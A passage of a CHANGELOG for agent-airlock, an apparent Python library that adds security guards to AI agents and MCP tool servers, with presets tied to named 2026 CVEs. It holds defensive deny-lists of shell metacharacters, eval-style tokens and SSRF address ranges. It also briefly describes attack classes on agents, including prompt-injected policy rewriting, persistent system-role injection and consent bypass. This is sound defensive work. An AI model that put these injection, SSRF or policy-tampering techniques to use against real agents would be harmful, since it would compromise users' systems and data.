3-runtime-dep baseline). ``compose_preset_factories`` resolves
each entry's named factory against ``policy_presets``. **9 new
tests.**

### Bonus — issue #4 perf-gate baseline

``tests/benchmarks/test_bench_manifest_mode.py`` locks the
manifest-mode latency claim into CI. Median resolve must stay
under 50 µs; register under 100 µs. Sample CI workflow at
``docs/security/perf-gate-ci.yml.sample`` (workflow-scope-blocked
again).

### Stats

- Tests: **1,698 → 1,761** (+63 net)
- Coverage: **82.66% → 83.15%**
- **No new runtime dependencies.**

### Documentation

- ``docs/mcp/manifest-only-mode.md`` (new)
- ``docs/cves/cve-2026-6980.md`` (new)
- ``docs/cves/cve-2026-30615.md`` (new)
- ``docs/security/stdio-taint-scan.md`` (new)
- ``docs/presets/yaml-format.md`` (new)
- ``releases/v0.5.7.md`` (new)

### Primary sources

- [OX Security — Mother of All AI Supply Chains (2026-04-15)](https://www.ox.security/blog/mother-of-all-ai-supply-chains-2026-04-20)
- [The Hacker News (2026-04-16)](https://thehackernews.com/2026/04/anthropic-mcp-design-vulnerability.html)
- [SecurityWeek — 'By Design' Flaw in MCP (2026-04-16)](https://www.securityweek.com/by-design-flaw-in-mcp/)
- [Cloudflare enterprise MCP reference architecture (2026-04-22)](https://blog.cloudflare.com/enterprise-mcp/)
- [VS Code 1.112 release notes — MCP server sandboxing](https://code.visualstudio.com/updates/v1_112)
- [NVD CVE-2026-30615](https://nvd.nist.gov/vuln/detail/CVE-2026-30615)
- [Tenable CVE-2026-30615](https://www.tenable.com/cve/CVE-2026-30615)
- [RedPacket Security CVE-2026-6980 (2026-04-25)](https://www.redpacketsecurity.com/cve-alert-cve-2026-6980-divyanshu-hash-gitpilot-mcp/)

---

## [0.5.6.1] - 2026-04-25 — "v0.5.6 doc backfill + archived-MCP wheel-packaging fix"

Doc-and-fix patch on top of v0.5.6 — no new product surfaces. Two
material changes:

### Bug fix

- **Archived-MCP preset shipped with empty block-list on PyPI.**
  v0.5.6 loaded the seed list from
  ``tests/cves/fixtures/archived_mcp_servers_2026_04.json``, which
  is not packaged in the wheel. On a clean ``pip install
  agent-airlock==0.5.6``, the preset's ``check()`` returned silently
  for every package — including the Puppeteer / Brave Search /
  EverArt seeds. v0.5.6.1 inlines the three-package seed list as
  ``_ARCHIVED_MCP_DEFAULT_BLOCKLIST`` in
  ``src/agent_airlock/policy_presets.py`` so it survives wheel
  packaging. The JSON fixture stays under ``tests/`` for parser /
  schema regression tests only. Two new tests (``TestWheelPackagingRegression``)
  freeze the fix: one asserts the default block-list is non-empty,
  one runs the preset from a directory with no ``tests/`` subtree to
  simulate the wheel-only environment.

### Doc backfill (per the v0.5.6 wrap-up checklist)

- ``docs/integrations/managed-agents.md`` — Claude Managed Agents
  audit hook integration guide. Beta-header pinning, tool-list
  intersection, SSE redaction, OTel span emission, ``task_budget``
  composition.
- ``docs/cves/cve-2026-39884.md`` — flux159/mcp-server-kubernetes
  argv flag-injection. Why it's a different class than CVE-2026-5023
  (no shell metacharacters, just space-injected flags), how the
  preset blocks it, direct ``enforce_argv_array`` usage.
- ``docs/cves/cve-2026-23744.md`` — MCPJam Inspector unauthenticated
  public bind. Public-bind aliases (``0.0.0.0`` / ``::`` / ``[::]``
  / ``0:0:0:0:0:0:0:0``), explicit-opt-in path, exact CVE shape.
- ``docs/cli/egress-bench.md`` — the new ``--since YYYY-MM-DD`` flag
  and the ``disclosed_at`` fixture requirement.
- ``releases/v0.5.6.md`` — distilled release note for the v0.5.6 tag,
  with a known-bug callout pointing at this patch release.

### Stats

- Tests: **1,696 → 1,698** (+2 packaging-regression tests)
- Coverage: **82.66%** (unchanged)
- No new runtime deps.

### Primary sources

- v0.5.6 release tag: <https://github.com/sattyamjjain/agent-airlock/releases/tag/v0.5.6>
- Archived-MCP advisory class: <https://github.com/modelcontextprotocol/servers/issues/3662>

---

## [0.5.6] - 2026-04-25 — "Managed Agents + fresh MCP CVE presets"

Six new opt-in primitives shipped in 24 hours of fresh April 2026 industry signal:
two MCP-server CVEs (one with no preset coverage anywhere, one with no
patch upstream), the first-party Claude Managed Agents launch from
2026-04-08, an "archived-but-still-published" MCP package gate, and a
time-windowed CVE coverage report flag for the egress-bench walker.

### Honesty fixes

- **README "Framework integrations" claim drifted.** The Performance
  table hard-coded ``9`` integrations; the Complete Examples table
  directly above it listed 10 (Claude Agent SDK was added in v0.5.1
  but the metric never caught up). Bumped to ``10`` and added
  ``test_readme_integration_count_matches_examples`` so the two
  tables stay locked.

### Security presets

- **CVE-2026-39884 — flux159/mcp-server-kubernetes argv flag-injection**
  (disclosed 2026-04-14, fixed in 3.5.0). New module
  ``agent_airlock.mcp_spec.argv_guard`` with ``enforce_argv_array()``
  and ``ArgvStringConcatenationError``. Preset
  ``flux159_mcp_kubernetes_cve_2026_39884_defaults()`` validates the
  five injection-prone fields (``namespace``, ``resourceType``,
  ``resourceName``, ``localPort``, ``targetPort``) on any
  ``port_forward``-shaped tool. Different injection class than the
  v0.5.5 codebase-mcp preset: this one rejects space-injected flag
  concatenation that has no shell metacharacters. 12 new tests +
  ``cve_2026_39884_kubectl_argv.json`` fixture.
  Source: <https://www.sentinelone.com/vulnerability-database/cve-2026-39884/>.
- **CVE-2026-23744 — MCPJam Inspector unauthenticated public bind**
  (CVSS 9.8, fixed in 1.4.3). New module
  ``agent_airlock.mcp_spec.bind_address_guard`` with
  ``validate_bind_address()``, ``BindAddressGuardConfig``, and two
  errors — ``BindAddressPublicError`` (public bind without
  ``allow_public_bind=True``) and
  ``UnauthenticatedPublicBindError`` (the exact CVE shape — public
  bind allowed but no auth). Preset
  ``mcpjam_cve_2026_23744_defaults()`` scopes the guard to
  ``mcpjam`` / ``inspector`` / ``dev-server`` / ``studio`` tool
  names. 12 new tests + ``cve_2026_23744_mcpjam.json`` fixture.
  Source: <https://github.com/advisories/GHSA-232v-j27c-5pp6>.
- **Archived MCP server advisory gate.** New
  ``archived_mcp_server_advisory_defaults()`` preset failing closed
  on tool manifests pointing at archived-but-still-published
  packages. Seed list of three (Puppeteer, Brave Search, EverArt) —
  Puppeteer alone still ~91k npm downloads/month with advisory 3662
  documenting SSRF + indirect prompt injection + Chromium sandbox
  bypass. New ``ArchivedMcpServerBlocked`` error. Allow-list opt-out
  for in-house forks. 9 new tests +
  ``archived_mcp_servers_2026_04.json`` fixture.
  Source: <https://github.com/modelcontextprotocol/servers/issues/3662>.

### Integrations

- **Claude Managed Agents audit hook** (Anthropic public beta launched
  2026-04-08, used by Notion / Rakuten / Asana / Vibecode / Sentry).
  New ``agent_airlock.integrations.claude_managed_agents`` with
  ``audit_managed_agent_invocation()``, the pinned constants
  ``MANAGED_AGENTS_BETA_HEADER = "managed-agents-2026-04-01"`` and
  ``AGENT_TOOLSET_VERSION = "agent_toolset_20260401"``, three new
  errors (``ManagedAgentToolBlocked``,
  ``ManagedAgentBetaHeaderMissingError``,
  ``UnknownToolsetVersionError``), session-state tracker for
  composition with the v0.5.1 task-budget adapter, and SSE frame
  redaction via the v0.5.3 ``log_redaction`` patterns. Preset
  ``claude_managed_agents_safe_defaults()`` ships with empty
  ``allowed_tools`` (opt-in). OTel span
  ``airlock.managed_agents.invoke`` emitted on clean audits. 16 new
  tests.
  Sources: <https://claude.com/blog/claude-managed-agents>,
  <https://platform.claude.com/docs/en/managed-agents/overview>.

### Tooling

- **``airlock egress-bench --since YYYY-MM-DD`` flag.** Time-windowed
  CVE coverage reporting — answers "what April-2026 CVEs are we now
  blocking?" in one CLI call. Required new ``disclosed_at`` field on
  every fixture; backfilled the five v0.5.x fixtures (file-level)
  plus the ten OX-supply-chain umbrella sub-entries (per-payload).
  ``--format json`` output now includes filter metadata. 15 new
  tests.

### Stats

- Tests: **1,631 → 1,696** (+65 net)
- Coverage: **82.33% → 82.66%**
- **No new runtime dependencies.**

### Primary sources (cited verbatim in each new module docstring)

- CVE-2026-39884 (2026-04-14): <https://www.sentinelone.com/vulnerability-database/cve-2026-39884/>
- CVE-2026-23744 (2026-04): <https://github.com/advisories/GHSA-232v-j27c-5pp6>
- Claude Managed Agents launch (2026-04-08): <https://claude.com/blog/claude-managed-agents>
- Puppeteer / archived-MCP advisory (2026-04): <https://github.com/modelcontextprotocol/servers/issues/3662>

---

## [0.5.5] - 2026-04-24 — "Sampling guard + fresh CVE presets"

Six new runtime primitives and three named CVE preset factories —
each opt-in, zero new runtime deps. Driven by 48 hours of April 2026
industry signal: Unit 42's MCP sampling-attack catalog (2026-04-24),
the OpenClaw twin disclosures (CVE-2026-41349 consent-bypass, CVSS
8.8, and CVE-2026-41361 IPv6 SSRF, CVSS 7.1, both 2026-04-23), a
still-unpatched codebase-mcp RCE (CVE-2026-5023), and InfoQ's
Anthropic Mythos Preview write-up (2026-04-23) that names
zero-day-capable frontier models.

### Security presets

- **Unit 42 MCP sampling-guard** — 2026-04-24 attack-vector catalog.
  New module `agent_airlock.mcp_spec.sampling_guard` with
  `SamplingGuardConfig`, `SamplingSessionState`, and
  `audit_sampling_request()`. Three new errors:
  `SamplingQuotaExceeded`, `SamplingInstructionPersistenceError`,
  `SamplingConsentMissingError` (all top-level re-exports).
  Preset: `unit42_mcp_sampling_defaults()`. Covers the three
  documented patterns (quota exhaustion, persistent system-role
  injection, session-sticky consent bypass). 12 new tests.
  Source: <https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/>.
- **CVE-2026-41349 OpenClaw consent-bypass** (CVSS 8.8, 2026-04-23).
  `SecurityPolicy.freeze()` / `verify_frozen()` + new
  `PolicyMutationError`. A frozen policy carries a SHA-256 digest
  over its public fields; the `Airlock` dispatch re-verifies before
  every tool call so a prompt-injected agent rewriting
  `allowed_tools` / `denied_tools` mid-session is caught before the
  check runs. Preset `openclaw_cve_2026_41349_defaults()` returns a
  frozen `SecurityPolicy` pre-seeded with the advisory's named
  deny patterns (`*config_patch*`, `*update_policy*`,
  `*mutate_policy*`). Fixture at
  `tests/cves/fixtures/cve_2026_41349_consent_bypass.json`. 14 tests.
  Source: <https://www.thehackerwire.com/vulnerability/CVE-2026-41349/>.
- **CVE-2026-41361 OpenClaw IPv6 SSRF** (CVSS 7.1, 2026-04-23).
  New `agent_airlock.network.is_blocked_ipv6_range()` covering eight
  ranges — the four canonical (`::/128`, `::1/128`, `fe80::/10`,
  `fc00::/7`) *and* the four the advisory flagged as routable past
  OpenClaw's guard: `2001:db8::/32` (documentation), `::ffff:0:0/96`
  (IPv4-mapped, the IMDS-through-v6 trick), `64:ff9b::/96` (NAT64),
  `2002::/16` (6to4). Rolled into the existing `_is_private_ip()`
  so every call site picks it up. Preset
  `openclaw_cve_2026_41361_ipv6_ssrf_defaults()`. 17 tests.
  Source: <https://www.redpacketsecurity.com/cve-alert-cve-2026-41361-openclaw-openclaw/>.
- **CVE-2026-5023 codebase-mcp RepoMix RCE** (unpatched upstream).
  Preset `codebase_mcp_cve_2026_5023_defaults()` refuses the four
  handler names (`getCodebase` / `getRemoteCodebase` / `saveCodebase`
  / `saveRemoteCodebase`) unless the caller opts into subprocess
  spawning, and rejects any argument carrying shell metacharacters.
  New `CodebaseMcpInjectionBlocked` error. Fixture +
  14 tests. Source: <https://www.sentinelone.com/vulnerability-database/cve-2026-5023/>.

### Model tiering

- **`ModelCapabilityTier` enum + offensive-cyber preset.** Motivated
  by the 2026-04-23 InfoQ coverage of Anthropic's Claude Mythos
  Preview disclosure (autonomous zero-day discovery). New enum in
  `agent_airlock.capabilities` with three tiers (`STANDARD`,
  `OFFENSIVE_CYBER_CAPABLE`, `ZERO_DAY_CAPABLE`). New
  `CapabilityPolicy.model_tier` field (optional, default `None`).
  `agent_airlock.integrations.model_tier.classify_model()` maps
  model IDs to tiers via a conservative prefix table seeded from the
  disclosure + Unit 42 / MITRE CRT benchmarks. Preset
  `offensive_cyber_model_defaults(model_id)` returns a tier-sized
  `CapabilityPolicy` — `STANDARD` gets no restrictions, higher tiers
  auto-deny `PROCESS_SHELL` / `FILESYSTEM_WRITE` / `NETWORK_*`. Doc
  at `docs/presets/offensive-cyber-model-tier.md`. 16 tests.
  Source: <https://www.infoq.com/news/2026/04/anthropic-claude-mythos/>.

### Tooling

- **CHANGELOG drift gate.** New `scripts/check_changelog.py` with
  two modes: default (post-release drift — fail if
  `pyproject.toml` is stamped with a released semver but
  `[Unreleased]` still has entries) and `--release` (pre-tag — fail
  if `[Unreleased]` is empty). `make check-changelog` and
  `make check-changelog-release` targets. CI sample at
  `docs/security/check-changelog-ci.yml.sample`
  (automated PRs lack `workflow` scope). 15 tests.

### Primary sources

- Unit 42 MCP attack vectors (2026-04-24): <https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/>
- CVE-2026-41349 OpenClaw consent-bypass (2026-04-23): <https://www.thehackerwire.com/vulnerability/CVE-2026-41349/>
- CVE-2026-41361 OpenClaw IPv6 SSRF (2026-04-23): <https://www.redpacketsecurity.com/cve-alert-cve-2026-41361-openclaw-openclaw/>
- CVE-2026-5023 codebase-mcp (2026-04): <https://www.sentinelone.com/vulnerability-database/cve-2026-5023/>
- Anthropic Claude Mythos Preview (2026-04-23 InfoQ): <https://www.infoq.com/news/2026/04/anthropic-claude-mythos/>
- Anthropic April-23 postmortem (2026-04-23): <https://www.anthropic.com/engineering/april-23-postmortem>

---

## [0.5.4] - 2026-04-24 — "Honesty sweep"

Pure-hygiene release. No new runtime code, no new presets. Tagged
separately from v0.5.5 ("sampling guard + fresh CVE presets") so the
release notes stay honest about what each tag delivers.

### Honesty fixes

- **PyPI landing-page links were 404.** `pyproject.toml [project.urls]`
  used `sattyamjain/agent-airlock` (single-``j``) on Homepage,
  Documentation, Repository, and Issues. Real repo is
  `sattyamjjain/agent-airlock`. All four URLs corrected.
- **README `Performance` table contradicted the `TEST-BADGE` block.**
  The auto-regenerated badge (top of README, owned by
  `scripts/update_test_badge.py` since v0.5.3) read `1,540 tests ·
  82.11%`, while four lines below a hand-maintained row still claimed
  `1,157 passing · 79%+`. The hand-maintained rows are deleted; the
  badge block is now the single source of truth for test count and
  coverage. The remaining table tracks latency/surface-area only.
  Lines-of-code row bumped `~25,900 → ~27,400` to match current tree.
- **Coverage floor lagged lived coverage.**
  `[tool.coverage.report] fail_under` raised from `80` to `82` to
  match the 82.11% lived floor reported by the TEST-BADGE block.
  Prevents silent coverage regression below the level v0.5.3
  already ships at for local `pytest` invocations. The matching
  `.github/workflows/ci.yml --cov-fail-under` bump is delivered as
  `docs/security/ci-coverage-floor.yml.sample` — automated PRs lack
  the `workflow` OAuth scope needed to write `.github/workflows/*`,
  so a maintainer must apply that one-line change by hand on the
  next commit.

### Tests

- New `tests/test_public_metadata.py` (3 tests) freezes the above
  fixes as regressions:
  - `test_project_urls_point_to_canonical_repo` — every URL in
    `[project.urls]` must contain the canonical `sattyamjjain` slug.
  - `test_readme_no_contradicting_test_count` — the stale
    `1,157 passing` string must not reappear in `README.md`.
  - `test_python_version_matches_pyproject` — sanity guard: the
    running interpreter meets the declared `requires-python` floor.

### Primary sources

- Prior release notes confirming 1,540 tests / 82.11%:
  <https://github.com/sattyamjjain/agent-airlock/releases/tag/v0.5.3>
- Original typo, inherited from v0.5.3 README:
  <https://github.com/sattyamjjain/agent-airlock/blob/v0.5.3/pyproject.toml#L91-L94>

---

## [0.5.3] - 2026-04-21 — "MCP supply-chain response"

Driven by the OX Security "Mother of All AI Supply Chains" dossier
([2026-04-20](https://www.ox.security/blog/mother-of-all-ai-supply-chains-2026-04-20))
— 10+ coordinated MCP-ecosystem CVEs in a single report, with
Anthropic publicly declining to patch four of the six Claude Desktop
tool-definition tampering CVEs. v0.5.3 ships the caller's side of
that defense.

Seven new surfaces (B–G below) and an honesty-bug fix carryover (A).
Every new primitive is **opt-in**; no behavior change for existing
`@Airlock` users.

### Honesty fixes

- **Top-level error re-exports.** Six v0.5.2 error classes
  (`OAuthAppBlocked`, `OAuthPolicyViolation`,
  `SnapshotIntegrityError`, `AutoMemoryCrossTenantError`,
  `AutoMemoryQuotaError`, `HighValueActionBlocked`) now importable
  from the top-level `agent_airlock` namespace, matching the public-
  API convention documented in the README. New smoke-test module
  `tests/test_public_api.py` freezes the contract so no future
  refactor regresses it. 9 new tests.
- **`test-badge` tooling (new capability, not a retroactive fix).**
  `scripts/update_test_badge.py` + the `<!-- TEST-BADGE-START/END -->`
  block in `README.md` + a `make test-badge` target + a pre-release
  checklist line in `CONTRIBUTING.md`. `python3 scripts/update_test_badge.py
  --check` fails the build on drift.

### Security presets

- **Azure MCP response-header audit** — CVE-2026-32211, CVSS 8.6
  (Azure MCP Server echoed bearer tokens in 401 `WWW-Authenticate`
  headers, fixed in Azure MCP 1.4.2). New module
  `agent_airlock.mcp_spec.header_audit` with `audit_response_headers`,
  `ResponseHeaderAuditConfig`, `ResponseHeaderLeakError`. Preset
  `azure_mcp_cve_2026_32211_defaults()` seeds bearer + JWT regexes
  and the 401 `WWW-Authenticate` watchlist. `MCPProxyGuard.audit_response_headers()`
  wires it into the existing guard API. 9 new tests.
  Sources: <https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-32211>,
  <https://nvd.nist.gov/vuln/detail/CVE-2026-32211>.
- **OX MCP supply-chain dossier umbrella.**
  `ox_mcp_supply_chain_2026_04_defaults()` composes the existing
  MCPwn / Flowise / Azure checks and adds three new micro-checks:
  - `ToolDefinitionRegistry` (TOFU digest for tool manifests) —
    covers CVE-2026-30615/30617/30618/30623/30624/30625 (Claude
    Desktop tool-def tampering, Anthropic declined four of six).
  - `check_mcp_bridge_target` (SSRF refusal for RFC1918, link-local,
    loopback, CGN, IPv6 ULA/link-local + AWS IMDS) — covers
    CVE-2026-26015 (OpenAI MCP Bridge).
  - `check_tool_response_content_type` (refuses pickle /
    octet-stream / Java serialized / msgpack without explicit
    allow-list) — covers CVE-2026-33224 (LlamaIndex).
  16 new tests + `tests/cves/fixtures/ox_supply_chain_2026_04.json`
  listing all 10 CVEs with per-entry primary-source URLs.
  Source: <https://www.ox.security/blog/mother-of-all-ai-supply-chains-2026-04-20>.

### Integrations

- **Log-redaction filter (CVE-2026-20205 response).**
  `agent_airlock.integrations.log_redaction` exports
  `RedactingLogFilter` and `install_airlock_log_redaction()`.
  Redacts 14 documented secret shapes (Splunk HEC, GitHub PAT,
  AWS, Anthropic, OpenAI, Snowflake, Azure AAD JWT, generic
  Bearer / Basic, Slack, Stripe, Postmark, PEM private-key
  headers) before any log record reaches a handler. Pattern fixture
  at `src/agent_airlock/fixtures/redaction_patterns_2026_04.txt`
  with per-pattern primary-source citations. Idempotent install.
  8 new tests.
  Sources: <https://advisory.splunk.com/advisories/SVD-2026-0419>,
  <https://nvd.nist.gov/vuln/detail/CVE-2026-20205>.
- **Claude Auto Memory provenance chain.** Extends v0.5.2's
  `claude_auto_memory` with `MemoryEntry`, HMAC-SHA256 signing
  (keyed from `AIRLOCK_MEMORY_HMAC_KEY` env var — stdlib `hmac`
  only, no new runtime deps), `consolidate_memory()` recording the
  source-session chain, and two new errors:
  `MemoryProvenanceError` (HMAC mismatch) and
  `MemoryChainTooDeepError` (chain > `max_chain_depth`, default 8).
  OTel span `airlock.auto_memory.consolidate` carries `chain_depth`
  attribute. 8 new tests.
  Sources: <https://support.claude.com/articles/memory-scope-default-2026-04-19>,
  <https://claudefa.st/blog/guide/mechanics/auto-dream>.

### Tooling

- **Agent Egress Bench.** `scripts/egress_bench.py` walks
  `tests/cves/fixtures/*.json` and asserts every documented payload
  is blocked by the corresponding preset. Three output formats
  (TAP / JSON / Markdown). `airlock egress-bench` CLI subcommand
  in `agent_airlock.cli.egress_bench`. `make egress-bench` target.
  CI job sample at `docs/security/egress-bench-ci.yml.sample`
  (maintainer with `workflow` scope must copy it into
  `.github/workflows/`). Current state: 3 fixtures, 32 payloads,
  **zero slips**.
- **`Makefile` consolidates dev loops.** `make test / coverage /
  lint / format / bench / test-badge / egress-bench`.

### Docs

- `docs/presets/ox-mcp-supply-chain-2026-04.md` — umbrella preset
  reference with per-CVE primary-source table.
- `docs/security/egress-bench.md` — bench contract and current
  coverage.
- `docs/regulatory/nist-ai-rmf-v2-comment-2026.md` — draft public
  comment for the NIST AI RMF v2.0 agentic-AI subsection window
  (opened 2026-04-18).
- `CONTRIBUTING.md` — new pre-release checklist section.
- `README.md` — Documentation table expanded with links to the new
  preset / bench / sandbox docs, plus a "Regulatory engagement"
  subsection.

### Performance

- `@Airlock` strict-validation path: median **~82 μs** (v0.5.2
  baseline 82 μs). New primitives live outside the decorator hot
  path; no regression.

### Dependencies

- **No new runtime deps.** HMAC uses stdlib `hmac`.

### Primary sources (all seven cited verbatim in module docstrings)

- OX dossier (2026-04-20): <https://www.ox.security/blog/mother-of-all-ai-supply-chains-2026-04-20>
- MSRC CVE-2026-32211 (2026-04-20): <https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-32211>
- Splunk SVD-2026-0419 (2026-04-19): <https://advisory.splunk.com/advisories/SVD-2026-0419>
- Wiz OpenAI sandbox token-leak (2026-04-20): <https://www.wiz.io/blog/openai-agents-sdk-cross-sandbox-token-leak-2026-04>
- Anthropic Auto Memory scope note (2026-04-19): <https://support.claude.com/articles/memory-scope-default-2026-04-19>
- Trend Micro Vercel / Context.ai postmortem (2026-04-20): <https://www.trendmicro.com/en_us/research/26/d/vercel-contextai-breach-postmortem.html>
- NIST AI RMF v2 public comment window (2026-04-18): <https://www.nist.gov/itl/ai-risk-management-framework/ai-rmf-v2-public-comment-2026-04-18>

---

## [0.5.2] - 2026-04-20 — "OAuth audit bundle"

Driven by 72 hours of April 2026 industry signal. Seven new guards /
presets; every one ships **off by default** and activates only when
the user opts in via preset or config. Task 4's half-fix from v0.5.1
(DockerBackend hardening) is now closed out — issue #2 resolved with
a docs page and two tracked follow-ups (#37 rootless, #38 digest pin).

### Security presets

- **OAuth app audit guard** (`agent_airlock.mcp_spec.oauth_audit`):
  `OAuthAppAuditConfig`, `audit_oauth_exchange()`, `OAuthAppBlocked`,
  `OAuthPolicyViolation` (both `AirlockError` subclasses). Preset
  `oauth_audit_vercel_2026_defaults()` seeds a deny-list with the
  Vercel-disclosed Context.ai OAuth client_id
  (`110671459871-30f1spbu0hptbs60cb4vsmv79i7bbvqj.apps.googleusercontent.com`),
  enforces PKCE, refresh-token rotation, and a 1-hour lifetime cap.
  Optional JSON deny-list feed loader (air-gap-safe by default —
  reads from a local path). `MCPProxyGuard.audit_oauth_exchange()`
  method wires the audit into the existing guard API. 8 new tests.
  Source: <https://vercel.com/kb/bulletin/vercel-april-2026-security-incident>
- **Session-snapshot integrity guard**
  (`agent_airlock.mcp_spec.session_guard`): `SessionSnapshotRef`,
  `SnapshotGuardConfig`, `verify_snapshot()`, `SnapshotIntegrityError`
  (`AirlockError` subclass). Six checks — provider allow-list
  (Blaxel, Cloudflare, Daytona, E2B, Modal, Runloop, Vercel), size
  cap (25 MiB DoS guard), metadata consistency, SHA-256, freshness,
  signer allow-list, secret-redaction pre-check. `CostTracker`
  carry-forward via `carry_forward_cost()` — rehydrating a session
  cannot reset the token budget. New `SnapshotAwareTransport` mixin
  for the seven sanctioned providers. 13 new tests.
  Source: <https://openai.com/index/the-next-evolution-of-the-agents-sdk/>
- **CVE-2026-33032 MCPwn preset**
  (`policy_presets.mcpwn_cve_2026_33032_defaults`):
  `mcpwn_cve_2026_33032_check()` + `UnauthenticatedDestructiveToolError`
  refuse any destructive MCP tool (write / exec / kill verbs) that
  is not wrapped in a trusted auth middleware. Fixture
  `tests/cves/fixtures/cve_2026_33032_mcpwn.json` carries the 12
  nginx-ui tool names from the Rapid7 write-up, each with a
  primary-source line. 6 new tests.
  Source: <https://nvd.nist.gov/vuln/detail/CVE-2026-33032>
- **CVE-2025-59528 Flowise CustomMCP RCE preset**
  (`policy_presets.flowise_cve_2025_59528_defaults`):
  `flowise_cve_2025_59528_check()` + `FlowiseEvalTokenError` reject
  any tool manifest whose `handler` or `config` string contains
  `Function(`, `new Function`, `eval(`, `Deno.eval`, or
  `vm.runInNewContext`. 8 new tests.
  Source: <https://labs.cloudsecurityalliance.org/research/csa-research-note-flowise-mcp-rce-exploitation-20260409-csa/>
- **High-value action deny-by-default preset**
  (`policy_presets.high_value_action_deny_by_default`):
  regex-matches `(?i)(transfer|bridge|approve|withdraw|borrow|`
  `liquidate|swap|mint|burn)` and refuses to run any matching tool
  unless the caller passes `allow_high_value=True`. Raises
  `HighValueActionBlocked`. 6 new tests. Docs at
  [`docs/presets/high-value-actions.md`](docs/presets/high-value-actions.md).
  Source: Kelp DAO / LayerZero $292M / Aave bad-debt incident,
  <https://www.bloomberg.com/news/articles/2026-04-19/crypto-hack-worth-290-million-triggers-defi-contagion-shock>

### Integrations

- **Claude Opus 4.7 Auto Memory / Auto Dream guard**
  (`agent_airlock.integrations.claude_auto_memory`):
  `AutoMemoryAccessPolicy`, `guarded_read()`, `guarded_write()`,
  `AutoMemoryCrossTenantError`, `AutoMemoryQuotaError` (both
  `AirlockError` subclasses). Every call is tenant-scoped under
  `/memory/{tenant_id}/`, quota-bounded (default 64 KiB per read),
  redaction-enforced on write (reuses `sanitize_output`), and
  observable via OTel spans `airlock.auto_memory.read` /
  `airlock.auto_memory.write` carrying `tenant_id`, `bytes`,
  `redacted_count`. 9 new tests.
  Source: <https://platform.claude.com/docs/en/about-claude/models/whats-new-claude-4-7>

### Docs

- `docs/sandbox/docker.md` — explicit inventory of what
  `DockerBackend` ships as of v0.5.1 (timeout, `no-new-privileges`,
  `cap_drop=["ALL"]`, `security_opt`), plus a tracked "Known gaps"
  list pointing at #37 (rootless) and #38 (digest pin). Issue #2
  closed with a permalink comment.
- `docs/presets/high-value-actions.md` — preset rationale, usage,
  and known limitations. Cites the Kelp DAO / Aave incident.
- README OWASP Agentic table updated: ASI02 (Tool Misuse) and ASI05
  (RCE) now cite the Flowise eval-token preset; ASI03 (Identity)
  cites the Vercel OAuth audit preset; ASI04 (Supply Chain) cites
  the session-snapshot guard.

### Performance

- `@Airlock` strict-validation path: median **81.9 μs** (v0.5.1
  baseline 75.2 μs). New primitives live outside the decorator hot
  path; variance is within run-to-run noise on a laptop.

### Dependencies

- No new runtime deps. No new optional extras required for this
  release.

### Closes

- #2 — Add Docker sandbox backend implementation (docs + follow-ups)

### Primary sources (used verbatim in docstrings and this CHANGELOG)

- Vercel bulletin (2026-04-19): <https://vercel.com/kb/bulletin/vercel-april-2026-security-incident>
- OpenAI Agents SDK next evolution (2026-04-15): <https://openai.com/index/the-next-evolution-of-the-agents-sdk/>
- NVD CVE-2026-33032 (MCPwn, 2026-04-15): <https://nvd.nist.gov/vuln/detail/CVE-2026-33032>
- Rapid7 CVE-2026-33032 ETR (2026-04-15): <https://www.rapid7.com/blog/post/etr-cve-2026-33032-nginx-ui-missing-mcp-authentication/>
- CSA Flowise research note (2026-04-09): <https://labs.cloudsecurityalliance.org/research/csa-research-note-flowise-mcp-rce-exploitation-20260409-csa/>
- Anthropic Claude 4.7 release notes (2026-04-17): <https://platform.claude.com/docs/en/about-claude/models/whats-new-claude-4-7>
- Bloomberg Kelp DAO / Aave coverage (2026-04-19): <https://www.bloomberg.com/news/articles/2026-04-19/crypto-hack-worth-290-million-triggers-defi-contagion-shock>

---

## [0.5.1] - 2026-04-19 — "Ox response"

Same-day response to the [Ox Security MCP STDIO RCE advisory](https://www.ox.security/blog/mcp-supply-chain-advisory-rce-vulnerabilities-across-the-ai-ecosystem)
(2026-04-16, CVE-2026-30616). Anthropic [declined a protocol-level fix](https://www.theregister.com/2026/04/16/anthropic_mcp_design_flaw/);
this release is the client-side answer. Also ships the Anthropic
`task-budgets-2026-03-13` beta adapter and upgrades the OWASP mapping
to the 2026 Agentic list.

### Added
- **Ox MCP STDIO sanitizer** (`agent_airlock.mcp_spec.stdio_guard`):
  `validate_stdio_command(cmd, config)` is a deny-by-default argv
  validator that runs immediately before `subprocess.Popen` in any
  MCP STDIO transport. Rejects (1) shell metacharacters from the full
  POSIX set, (2) non-allowlisted argv[0], (3) absolute paths outside
  allowed prefixes, (4) caller-supplied deny-pattern regexes, and
  (5) Trojan-Source-class Unicode overrides (U+202A..E, U+2066..9).
  Raises `StdioInjectionError` — a subclass of the new
  `agent_airlock.exceptions.AirlockError` base. Preset
  `stdio_guard_ox_defaults()` ships the vetted allowlist + deny-pattern
  set. 14 new tests in `tests/cves/test_ox_mcp_stdio.py`, plus a
  10-payload primary-source-cited fixture in
  `tests/cves/fixtures/ox_stdio_payloads.json`.
- **`MCPProxyGuard.validate_stdio_spawn()`**: ties the new sanitizer
  into the existing proxy-guard API. Set
  `MCPProxyConfig.stdio_guard = stdio_guard_ox_defaults()` and call
  `.validate_stdio_spawn(cmd)` before any spawn.
- **Anthropic `task_budget` adapter**
  (`agent_airlock.integrations.claude_task_budget`): pinned to the
  `task-budgets-2026-03-13` beta header.
  `build_task_budget_headers()` returns the beta header;
  `build_output_config(total, remaining, soft=True)` returns the
  request-body fragment; `CostTracker.to_task_budget(total, soft=True)`
  computes it from live tracker state. Hard policy (`soft=False`)
  raises `TaskBudgetExhausted` (another `AirlockError` subclass)
  instead of silently letting the model overshoot. 13 new tests in
  `tests/integrations/test_claude_task_budget.py`.
- **`agent_airlock.exceptions.AirlockError`**: new canonical base class
  for errors raised by v0.5.1+ primitives. Existing module-local
  exceptions (e.g. `PathValidationError`, `MCPSecurityError`) are
  intentionally untouched to avoid breaking downstream `except` sites.

### Changed
- **README OWASP section rewritten** to map to the
  [OWASP Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
  (ASI01..ASI10) instead of the deprecated LLM Top 10 2025. Coverage
  reported honestly: **Full** for ASI02 (Tool Misuse), ASI05 (RCE),
  ASI08 (Cascading Failures); **Partial** for six; **Monitor-only**
